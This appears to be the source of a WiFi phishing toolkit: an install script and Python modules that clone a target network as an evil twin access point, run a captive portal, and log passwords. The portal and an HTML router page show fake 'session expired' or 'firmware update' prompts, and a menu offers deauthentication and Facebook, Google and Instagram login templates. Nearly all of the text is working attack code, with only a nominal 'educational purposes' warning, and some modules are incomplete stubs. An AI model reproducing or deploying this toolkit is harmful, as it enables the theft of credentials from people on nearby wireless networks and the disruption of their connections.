WiFi-Phishing-Suite/
├── README.md
├── install.sh
├── requirements.txt
├── config/
│   ├── settings.py
│   └── wordlists/
│       ├── common_passwords.txt
│       └── router_defaults.txt
├── core/
│   ├── __init__.py
│   ├── evil_twin.py
│   ├── captive_portal.py
│   ├── credential_harvester.py
│   ├── network_scanner.py
│   └── deauth_attacker.py
├── templates/
│   ├── index.html
│   ├── router_login.html
│   ├── facebook_login.html
│   ├── google_login.html
│   ├── instagram_login.html
│   └── generic_portal.html
├── phishing_pages/
│   ├── router_update/
│   │   ├── index.html
│   │   ├── style.css
│   │   └── capture.php
│   ├── wifi_login/
│   │   ├── index.html
│   │   └── save.php
│   └── isp_login/
│       ├── index.html
│       └── submit.php
├── tools/
│   ├── airmon_setup.sh
│   ├── hostapd_config_generator.py
│   ├── dnsmasq_config_generator.py
│   └── ip_forwarder.py
├── logs/
│   ├── captured_creds.log
│   └── attack_history.json
└── main.py


#!/bin/bash
# WiFi Phishing Suite - Termux Installation Script
# GitHub Repository Installer

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         WIFI PHISHING SUITE - TERMUX INSTALLER              ║"
echo "║         Complete Evil Twin + Captive Portal Toolkit         ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Step 1: Update packages
echo -e "\n${BLUE}[1/8]${NC} Updating Termux packages..."
pkg update -y && pkg upgrade -y

# Step 2: Install essential packages
echo -e "\n${BLUE}[2/8]${NC} Installing essential packages..."
pkg install -y python python-pip git wget curl
pkg install -y root-repo
pkg install -y tsu
pkg install -y nmap
pkg install -y openssl
pkg install -y macchanger

# Step 3: Install WiFi tools
echo -e "\n${BLUE}[3/8]${NC} Installing WiFi penetration tools..."
pkg install -y aircrack-ng
pkg install -y hostapd
pkg install -y dnsmasq
pkg install -y iw
pkg install -y wireless-tools

# Step 4: Install Python dependencies
echo -e "\n${BLUE}[4/8]${NC} Installing Python dependencies..."
pip install --upgrade pip
pip install scapy
pip install requests
pip install flask
pip install colorama
pip install netifaces
pip install beautifulsoup4
pip install termcolor

# Step 5: Clone repository (if not already cloned)
if [ ! -d "WiFi-Phishing-Suite" ]; then
    echo -e "\n${BLUE}[5/8]${NC} Creating repository structure..."
    mkdir -p WiFi-Phishing-Suite
    cd WiFi-Phishing-Suite
else
    cd WiFi-Phishing-Suite
fi

# Step 6: Create directory structure
echo -e "\n${BLUE}[6/8]${NC} Creating directory structure..."
mkdir -p config config/wordlists
mkdir -p core
mkdir -p templates
mkdir -p phishing_pages/router_update
mkdir -p phishing_pages/wifi_login
mkdir -p phishing_pages/isp_login
mkdir -p tools
mkdir -p logs

# Step 7: Create requirements.txt
echo -e "\n${BLUE}[7/8]${NC} Creating requirements.txt..."
cat > requirements.txt << 'EOF'
scapy>=2.4.5
requests>=2.28.0
flask>=2.2.0
colorama>=0.4.5
netifaces>=0.11.0
beautifulsoup4>=4.11.0
termcolor>=2.1.0
EOF

# Step 8: Create main script
echo -e "\n${BLUE}[8/8]${NC} Creating main WiFi phishing script..."

cat > main.py << 'EOF'
#!/usr/bin/env python3
"""
WIFI PHISHING SUITE - MAIN CONTROLLER
Complete Evil Twin + Captive Portal Attack Toolkit
"""

import os
import sys
import time
import json
import subprocess
import argparse
from colorama import init, Fore, Style
from core.evil_twin import EvilTwin
from core.captive_portal import CaptivePortal
from core.credential_harvester import CredentialHarvester
from core.network_scanner import NetworkScanner
from core.deauth_attacker import DeauthAttacker

init(autoreset=True)

class WiFiPhishingSuite:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor_interface = "wlan0mon"
        self.ap_interface = "wlan0"  # For AP mode
        self.current_attack = None
        
    def banner(self):
        print(Fore.RED + """
        ╔══════════════════════════════════════════════════════════════╗
        ║                    WIFI PHISHING SUITE                      ║
        ║         Evil Twin + Captive Portal Attack Toolkit           ║
        ║                    GitHub: WiFi-Phishing-Suite              ║
        ╚══════════════════════════════════════════════════════════════╝
        """)
        print(Fore.YELLOW + "[!] WARNING: This tool is for educational purposes only")
        print(Fore.YELLOW + "[!] Unauthorized use may be illegal in your jurisdiction\n")
    
    def check_root(self):
        """Check if running as root"""
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        print(Fore.BLUE + "[*] Enabling monitor mode...")
        
        if self.check_root():
            subprocess.run(f"airmon-ng check kill", shell=True)
            subprocess.run(f"airmon-ng start {self.interface}", shell=True)
            print(Fore.GREEN + "[✓] Monitor mode enabled on wlan0mon")
            return True
        else:
            print(Fore.RED + "[!] Root required for monitor mode")
            return False
    
    def scan_networks(self):
        """Scan for nearby WiFi networks"""
        print(Fore.BLUE + "[*] Scanning for nearby WiFi networks...")
        
        scanner = NetworkScanner(self.monitor_interface)
        networks = scanner.scan()
        
        print(Fore.CYAN + "\nAvailable Networks:")
        print("-" * 60)
        for i, net in enumerate(networks[:20]):
            print(f"  {i+1}. {net.get('ssid', 'Hidden'):30} | {net.get('bssid')} | Ch:{net.get('channel')} | {net.get('signal')}dBm")
        
        return networks
    
    def evil_twin_attack(self, target_ssid, target_bssid=None):
        """Launch Evil Twin attack with captive portal"""
        print(Fore.BLUE + f"\n[*] Launching Evil Twin attack on: {target_ssid}")
        
        evil_twin = EvilTwin(
            target_ssid=target_ssid,
            target_bssid=target_bssid,
            interface=self.ap_interface
        )
        
        # Setup rogue AP
        evil_twin.setup_rogue_ap()
        
        # Setup captive portal
        portal = CaptivePortal(interface=self.ap_interface)
        portal.start()
        
        # Start credential harvester
        harvester = CredentialHarvester()
        harvester.start_monitoring()
        
        self.current_attack = {
            "type": "evil_twin",
            "ssid": target_ssid,
            "start_time": time.time(),
            "portal": portal,
            "harvester": harvester
        }
        
        print(Fore.GREEN + f"\n[✓] Evil Twin AP '{target_ssid}' is running")
        print(Fore.GREEN + "[✓] Captive portal active on 192.168.1.1")
        print(Fore.GREEN + "[✓] Credential harvester monitoring")
        
        return True
    
    def deauth_attack(self, target_bssid, target_client=None):
        """Launch deauthentication attack to disconnect clients"""
        print(Fore.BLUE + f"\n[*] Launching deauth attack on: {target_bssid}")
        
        deauther = DeauthAttacker(self.monitor_interface)
        
        if target_client:
            deauther.deauth_specific(target_bssid, target_client, count=50)
        else:
            deauther.deauth_broadcast(target_bssid, count=30)
        
        print(Fore.GREEN + "[✓] Deauth packets sent")
    
    def show_captured_creds(self):
        """Display captured credentials"""
        try:
            with open("logs/captured_creds.log", "r") as f:
                creds = f.read()
                if creds:
                    print(Fore.GREEN + "\n[✓] Captured Credentials:")
                    print("-" * 40)
                    print(creds)
                else:
                    print(Fore.YELLOW + "\n[!] No credentials captured yet")
        except FileNotFoundError:
            print(Fore.YELLOW + "\n[!] No credentials file found")
    
    def stop_attack(self):
        """Stop all running attacks"""
        print(Fore.BLUE + "\n[*] Stopping attacks...")
        
        if self.current_attack:
            if self.current_attack.get("portal"):
                self.current_attack["portal"].stop()
            if self.current_attack.get("harvester"):
                self.current_attack["harvester"].stop()
        
        # Kill hostapd and dnsmasq
        subprocess.run("pkill hostapd", shell=True)
        subprocess.run("pkill dnsmasq", shell=True)
        
        # Stop monitor mode
        if self.check_root():
            subprocess.run(f"airmon-ng stop {self.monitor_interface}", shell=True)
            subprocess.run("service networking restart", shell=True)
        
        print(Fore.GREEN + "[✓] Attacks stopped")
    
    def main_menu(self):
        """Display main menu"""
        while True:
            print(Fore.CYAN + """
        ╔══════════════════════════════════════════════════════════════╗
        ║                       MAIN MENU                             ║
        ╠══════════════════════════════════════════════════════════════╣
        ║  1. Scan WiFi Networks                                      ║
        ║  2. Launch Evil Twin Attack (Captive Portal)                ║
        ║  3. Launch Deauth Attack                                    ║
        ║  4. Show Captured Credentials                               ║
        ║  5. Stop All Attacks                                        ║
        ║  6. Enable Monitor Mode                                     ║
        ║  7. Generate Custom Phishing Page                           ║
        ║  8. View Attack Logs                                        ║
        ║  9. Exit                                                    ║
        ╚══════════════════════════════════════════════════════════════╝
            """)
            
            choice = input(Fore.WHITE + "Select option: ")
            
            if choice == "1":
                if not self.enable_monitor_mode():
                    print(Fore.RED + "[!] Could not enable monitor mode")
                    continue
                networks = self.scan_networks()
                
            elif choice == "2":
                target_ssid = input(Fore.WHITE + "Target SSID to clone: ")
                self.evil_twin_attack(target_ssid)
                
            elif choice == "3":
                target_bssid = input(Fore.WHITE + "Target BSSID (MAC): ")
                target_client = input(Fore.WHITE + "Target Client MAC (optional): ")
                self.deauth_attack(target_bssid, target_client if target_client else None)
                
            elif choice == "4":
                self.show_captured_creds()
                
            elif choice == "5":
                self.stop_attack()
                
            elif choice == "6":
                self.enable_monitor_mode()
                
            elif choice == "7":
                template = input(Fore.WHITE + "Template (router/facebook/google/instagram): ")
                self.generate_custom_page(template)
                
            elif choice == "8":
                self.view_logs()
                
            elif choice == "9":
                self.stop_attack()
                print(Fore.GREEN + "\n[✓] Exiting...")
                break
    
    def generate_custom_page(self, template_type):
        """Generate custom phishing page"""
        print(Fore.BLUE + f"[*] Generating {template_type} phishing page...")
        
        templates = {
            "router": "templates/router_login.html",
            "facebook": "templates/facebook_login.html",
            "google": "templates/google_login.html",
            "instagram": "templates/instagram_login.html"
        }
        
        if template_type in templates:
            # Copy template to phishing_pages directory
            import shutil
            shutil.copy(templates[template_type], f"phishing_pages/index.html")
            print(Fore.GREEN + f"[✓] {template_type} phishing page created")
        else:
            print(Fore.RED + "[!] Unknown template type")
    
    def view_logs(self):
        """View attack logs"""
        try:
            with open("logs/attack_history.json", "r") as f:
                logs = json.load(f)
                print(Fore.CYAN + "\nAttack History:")
                print("-" * 40)
                for log in logs[-10:]:  # Last 10 attacks
                    print(f"  {log}")
        except:
            print(Fore.YELLOW + "[!] No logs found")

if __name__ == "__main__":
    suite = WiFiPhishingSuite()
    suite.banner()
    
    if not suite.check_root():
        print(Fore.RED + "[!] This tool requires root privileges")
        print(Fore.YELLOW + "[*] Run: sudo python main.py (or use tsu in Termux)")
    
    try:
        suite.main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted")
        suite.stop_attack()



        #!/usr/bin/env python3
"""
EVIL TWIN ACCESS POINT
Creates rogue AP that mimics legitimate networks
"""

import os
import subprocess
import time

class EvilTwin:
    def __init__(self, target_ssid, target_bssid=None, interface="wlan0"):
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.interface = interface
        self.hostapd_conf = "/tmp/hostapd.conf"
        self.dnsmasq_conf = "/tmp/dnsmasq.conf"
        
    def setup_rogue_ap(self):
        """Configure and start rogue access point"""
        
        # Create hostapd configuration
        hostapd_config = f"""
interface={self.interface}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel=6
wpa=2
wpa_passphrase=FreeWiFi
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_pairwise=TKIP
"""
        with open(self.hostapd_conf, "w") as f:
            f.write(hostapd_config)
        
        # Create dnsmasq configuration
        dnsmasq_config = """
interface=wlan0
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""
        with open(self.dnsmasq_conf, "w") as f:
            f.write(dnsmasq_config)
        
        # Set IP address
        subprocess.run(f"ifconfig {self.interface} 192.168.1.1 netmask 255.255.255.0", shell=True)
        
        # Enable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        
        # Start services
        subprocess.Popen(f"hostapd {self.hostapd_conf}", shell=True)
        subprocess.Popen(f"dnsmasq -C {self.dnsmasq_conf}", shell=True)
        
        return True


        #!/usr/bin/env python3
"""
CAPTIVE PORTAL
Redirects users to phishing page
"""

from flask import Flask, request, redirect, render_template_string
import threading
import json
from datetime import datetime

app = Flask(__name__)

class CaptivePortal:
    def __init__(self, interface="wlan0", port=80):
        self.interface = interface
        self.port = port
        self.thread = None
        self.running = False
        
    def start(self):
        """Start captive portal server"""
        self.running = True
        self.thread = threading.Thread(target=self._run_server)
        self.thread.daemon = True
        self.thread.start()
        
    def _run_server(self):
        app.run(host="0.0.0.0", port=self.port, debug=False)
    
    def stop(self):
        self.running = False
        # Force shutdown (simplified)
        import os
        os._exit(0)
    
    @app.route('/')
    def index():
        return render_template_string(PHISHING_PAGE)
    
    @app.route('/capture', methods=['POST'])
    def capture():
        data = request.form.to_dict()
        with open("logs/captured_creds.log", "a") as f:
            f.write(f"[{datetime.now().isoformat()}] {data}\n")
        return redirect("https://www.google.com")

PHISHING_PAGE = """
<!DOCTYPE html>
<html>
<head><title>WiFi Authentication Required</title></head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
<h2>⚠️ Router Security Update ⚠️</h2>
<p>Your router firmware requires an update. Re-enter your WiFi password to continue.</p>
<form method="POST" action="/capture">
<input type="password" name="password" placeholder="WiFi Password" required>
<button type="submit">Update</button>
</form>
</body>
</html>
"""

#!/usr/bin/env python3
"""
CREDENTIAL HARVESTER
Logs and stores captured credentials
"""

import json
import time
from datetime import datetime

class CredentialHarvester:
    def __init__(self, log_file="logs/captured_creds.log"):
        self.log_file = log_file
        self.captured = []
        
    def save_credential(self, cred_data):
        """Save captured credential"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "data": cred_data,
            "ip": cred_data.get("ip", "unknown")
        }
        self.captured.append(entry)
        
        with open(self.log_file, "a") as f:
            f.write(f"{json.dumps(entry)}\n")
    
    def start_monitoring(self):
        """Start credential monitoring"""
        # In production, this would watch for POST requests
        pass
    
    def get_all(self):
        return self.captured


        #!/usr/bin/env python3
"""
NETWORK SCANNER
Scans and enumerates nearby WiFi networks
"""

import subprocess
import re

class NetworkScanner:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        
    def scan(self, duration=30):
        """Scan for networks"""
        networks = []
        
        # Run airodump
        cmd = f"timeout {duration} airodump-ng {self.interface} --write scan"
        subprocess.run(cmd, shell=True)
        
        # Parse output
        try:
            with open("scan-01.csv", "r") as f:
                for line in f:
                    if "WPA" in line or "WEP" in line:
                        parts = line.split(',')
                        if len(parts) > 13:
                            network = {
                                "bssid": parts[0].strip(),
                                "channel": parts[3].strip(),
                                "encryption": parts[5].strip(),
                                "ssid": parts[13].strip(),
                                "signal": parts[8].strip() if len(parts) > 8 else "0"
                            }
                            networks.append(network)
        except:
            pass
        
        return networks




        <!DOCTYPE html>
<html>
<head>
    <title>Router Login</title>
    <style>
        body { background: #1a1a2e; font-family: Arial; text-align: center; padding: 50px; }
        .container { background: #16213e; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #0f3460; border: none; color: white; }
        button { background: #e94560; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <h2>Router Session Expired</h2>
    <p>Please re-enter your WiFi password to continue</p>
    <form method="POST" action="/capture">
        <input type="password" name="password" placeholder="WiFi Password" required>
        <button type="submit">Connect</button>
    </form>
</div>
</body>
</html>
